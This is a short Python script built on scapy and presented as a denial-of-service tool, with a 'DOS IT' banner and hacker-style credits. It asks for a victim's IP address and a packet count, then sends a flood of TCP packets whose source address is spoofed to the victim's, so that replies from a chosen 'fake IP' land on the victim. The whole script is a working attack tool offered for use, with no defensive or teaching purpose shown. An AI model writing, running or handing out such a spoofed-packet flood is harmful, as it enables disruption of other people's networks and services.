from scapy.all import *

def drawing():
	print("""\033[1;31;40m
	D D   OOOOOO   SSSSSS      I TTTTTTTT 
	D  D  O    O  S            I    T
	D   D O    O S             I    T
	D   D O    O  SSSSSS       I    T
	D   D O    O       S       I    T
	D  D  O    O      S        I    T
	D D   OOOOOO SSSSS         I    T

		 \033[1;31;40m""")
def name():
	print("\033[1;36;40m BY BLACK PANDA\n DEVELOPED BY: GOD\033;\n")

	

def dos():
	ip=input("\033[1;35;40mEnter victim's IP: ")
	count=input("How many packets you want to send: ")
	fake=input("Enter a fake IP: ")
	send(IP(src=ip, dst=fake)/TCP(sport=80, dport=80),count=int(count))
drawing()
name()
dos()